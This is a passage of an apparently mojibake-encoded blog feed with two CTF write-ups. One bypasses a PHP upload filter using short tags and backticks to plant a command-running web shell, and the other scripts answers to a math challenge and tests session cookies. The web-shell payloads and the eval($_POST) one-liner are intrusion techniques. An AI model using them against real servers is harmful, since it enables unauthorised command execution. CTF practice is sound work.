        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[çŸ­æ ‡ç­¾|åå¼•å·]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/'| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i"</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// if(preg_match("/'| |_|=|php/",$input))&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$input</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$input</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token variable">$input</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>      <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'sandbox/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"action"</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">:</span>        <span class="token keyword">echo</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'upload'</span><span class="token punctuation">:</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$dir</span></span>"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>é‡ç‚¹å°±æ˜¯ç»•è¿‡æ­£åˆ™ï¼Œä¸èƒ½ç”¨å¼‚æˆ–/å–åï¼Œæ•°ç»„ä¹Ÿä¸è¡Œ</p><p>çœ‹åˆ°phpéƒ½è¢«æ£€æµ‹äº†ï¼Œç¬¬ä¸€ååº”è‚¯å®šæ˜¯çŸ­æ ‡ç­¾</p><p>ä½†è¢«æ£€æµ‹äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ‰€ä»¥ç±»ä¼¼<code>&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;</code>å°±æ²¡æ³•</p><p>æœ€åæ˜¯çŸ­æ ‡ç­¾+åå¼•å·ï¼Œè‡³äºç©ºæ ¼ç”¨tab(%09)ä»£æ›¿</p><ul><li><p>åå¼•å·ç­‰ä»·äº<a href="https://www.php.net/manual/zh/function.shell-exec.php">shell_exec()</a></p><blockquote><ol><li>å…³é—­äº†<a href="https://www.php.net/manual/zh/function.shell-exec.php">shell_exec()</a>æ—¶åå¼•å·è¿ç®—ç¬¦æ˜¯æ— æ•ˆçš„ã€‚</li><li>ä¸å…¶å®ƒæŸäº›è¯­è¨€ä¸åŒï¼Œåå¼•å·ä¸èƒ½åœ¨åŒå¼•å·å­—ç¬¦ä¸²ä¸­ä½¿ç”¨ã€‚</li></ol></blockquote></li></ul><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls%09&#x2F;&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/image-20210814140706330.png"></p><pre class="line-numbers language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat%09&#x2F;flllllll1112222222lag&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[GXYCTF2019]StrongestMind</title>
      <link href="/p/2768731149.html"/>
      <url>/p/2768731149.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-StrongestMind/image-20210813171448566.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ç¬¬ä¸€ååº”æ˜¯ï¼Œå†™ä¸ªçˆ¬è™«è·‘ä¸€åƒæ¬¡ã€‚</p><p>å»¶è¿Ÿ2s+æ¯10æ¬¡å†å»¶è¿Ÿ10séƒ½ä¼š429 çœŸçš„çƒ¦ã€‚</p><p>æœ€é«˜è®°å½•ï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-StrongestMind/image-20210813192812312.png"></p><p>è€Œä¸”å¾ˆå¥‡æ€ªï¼Œæ˜æ˜æ˜¯åŒä¸€ä¸ªsessionï¼Œå…ˆgetå†postç­”æ¡ˆæ˜¯é”™çš„ï¼Œè¦æƒ³è·‘è„šæœ¬åªèƒ½ä¸åœçš„postç»“æœã€‚æ²¡æ³•é‡è¯•ã€‚</p><p>ç™¾åº¦çœ‹äº†ä¸‹åˆ«äººçš„wpï¼Œå»¶è¿Ÿ0.1séƒ½æ²¡é—®é¢˜ï¼Œä¸ºä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>æƒ³äº†å¾ˆä¹…ï¼Œçªç„¶å‘ç°ä¸€è¡Œæ£€æµ‹429çš„ä»£ç </p><pre class="line-numbers language-none"><code class="language-none">if r.status_code &#x3D;&#x3D; 429 or &#39;429&#39; in r.text:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-StrongestMind/111.jpg"></p><p>æ— è¯­å•Šæ— è¯­ï¼ŒçœŸå°±ç”»è›‡æ·»è¶³ä½œèŒ§è‡ªç¼šã€‚å¦‚æœè¡¨è¾¾å¼æœ‰429ä¸‰ä¸ªå­—ç¬¦ä¸å°±å®Œäº†å—ï¼ï¼</p><p>æ€ä¹ˆè¿™ä¹ˆæ— è¯­å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šã€‚</p><p>åˆè¯•äº†è¯•ï¼Œåœ¨ä¸€å¼€å§‹çš„getï¼Œä¸è®¾ç½®cookieï¼Œç„¶åæ¥postå°±æ²¡é—®é¢˜ã€‚ä½†å¦‚æœè®¾ç½®äº†cookieï¼Œé‚£åé¢çš„ç¬¬ä¸€ä¸ªpostå¿…é”™ã€‚</p><p>payload:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>    exp <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> soup<span class="token punctuation">.</span>body<span class="token punctuation">.</span>center<span class="token punctuation">.</span>stripped_strings<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://51f4e728-7df5-4989-8800-a1576ec0fdce.node4.buuoj.cn:81/index.php"</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf8'</span>result <span class="token operator">=</span> solve<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1002</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> result<span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf8'</span>    result <span class="token operator">=</span> solve<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">429</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"429äº†"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> n <span class="token operator">></span> <span class="token number">999</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">'bingo'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">'ç®—é”™'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç®—é”™äº†"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å…³äºè¿™sessionä¸‹çš„cookieé—®é¢˜"><a href="#å…³äºè¿™sessionä¸‹çš„cookieé—®é¢˜" class="headerlink" title="å…³äºè¿™sessionä¸‹çš„cookieé—®é¢˜"></a>å…³äºè¿™sessionä¸‹çš„cookieé—®é¢˜</h3><p>è¿™cookieè®©æˆ‘æ„Ÿè§‰å¾ˆå¥‡æ€ªï¼Œå†™ç‚¹ä»£ç æµ‹è¯•ä¸‹</p><h4 id="æµ‹è¯•1"><a href="#æµ‹è¯•1" class="headerlink" title="æµ‹è¯•1"></a>æµ‹è¯•1</h4><p>2.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PHPSESSID"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/2.php'</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬1æ¬¡getï¼š"</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬1æ¬¡çš„cookiesï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬1æ¬¡çš„sessionçš„cookies ï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬2æ¬¡getï¼š"</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬2æ¬¡çš„cookiesï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬2æ¬¡çš„sessionçš„cookies ï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'vepn9g7r3lqfc23skjn06te693'</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬3æ¬¡getï¼š"</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬3æ¬¡çš„cookiesï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬3æ¬¡çš„sessionçš„cookies ï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>update<span class="token punctuation">(</span>cookies<span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬4æ¬¡getï¼š"</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬4æ¬¡çš„cookiesï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬4æ¬¡çš„sessionçš„cookies ï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ç¬¬1æ¬¡getï¼šç¬¬1æ¬¡çš„cookiesï¼š&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;pm841ptlo3hcg90n4frjkgpufo for 127.0.0.1&#x2F;&gt;]&gt;ç¬¬1æ¬¡çš„sessionçš„cookies ï¼š&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;pm841ptlo3hcg90n4frjkgpufo for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------ç¬¬2æ¬¡getï¼špm841ptlo3hcg90n4frjkgpufoç¬¬2æ¬¡çš„cookiesï¼š&lt;RequestsCookieJar[]&gt;ç¬¬2æ¬¡çš„sessionçš„cookies ï¼š&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;pm841ptlo3hcg90n4frjkgpufo for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------ç¬¬3æ¬¡getï¼špm841ptlo3hcg90n4frjkgpufoç¬¬3æ¬¡çš„cookiesï¼š&lt;RequestsCookieJar[]&gt;ç¬¬3æ¬¡çš„sessionçš„cookies ï¼š&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;pm841ptlo3hcg90n4frjkgpufo for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------ç¬¬4æ¬¡getï¼švepn9g7r3lqfc23skjn06te693ç¬¬4æ¬¡çš„cookiesï¼š&lt;RequestsCookieJar[]&gt;ç¬¬4æ¬¡çš„sessionçš„cookies ï¼š&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;vepn9g7r3lqfc23skjn06te693 for &#x2F;&gt;, &lt;Cookie PHPSESSID&#x3D;pm841ptlo3hcg90n4frjkgpufo for 127.0.0.1&#x2F;&gt;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œsessionçš„ç¬¬ä¸€æ¬¡getï¼Œå®é™…ä¸Šè¿˜å¤„äºè®¾ç½®cookieçš„é˜¶æ®µï¼Œcookieä¼šæ”¾åˆ°è¿”å›åŒ…ï¼Œä¹‹åçš„è¿æ¥å°±ä¼šæ”¾åˆ°sessioné‡Œé¢äº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-StrongestMind/image-20210823171811013.png"></p><h4 id="æµ‹è¯•2"><a href="#æµ‹è¯•2" class="headerlink" title="æµ‹è¯•2"></a>æµ‹è¯•2</h4><p>ç™¾åº¦æœ‰äº›æ–‡ç« è¯´å¾—æŠŠdictè½¬åŒ–ä¸ºcookiejaræ‰èƒ½ä¼ ï¼Œ</p><p>çœ‹äº†ä¸‹å®˜æ–¹æ–‡æ¡£ï¼Œdictç›´æ¥ä¼ ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†ä»…é™ç¬¬ä¸€æ¬¡ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PHPSESSID"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/2.php'</span>cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token string">'aaa'</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æµ‹è¯•3"><a href="#æµ‹è¯•3" class="headerlink" title="æµ‹è¯•3"></a>æµ‹è¯•3</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TEST'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'TEST'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PHPSESSID"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'  '</span> <span class="token operator">.</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'TEST'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'vepn9g7r3lqfc23skjn06te693'</span><span class="token punctuation">,</span> <span class="token string">'TEST'</span><span class="token punctuation">:</span> <span class="token string">'FIX'</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/1.php'</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬1æ¬¡getï¼š"</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬1æ¬¡çš„cookiesï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬1æ¬¡çš„sessionçš„cookies ï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬2æ¬¡getï¼š"</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬2æ¬¡çš„cookiesï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬2æ¬¡çš„sessionçš„cookies ï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span 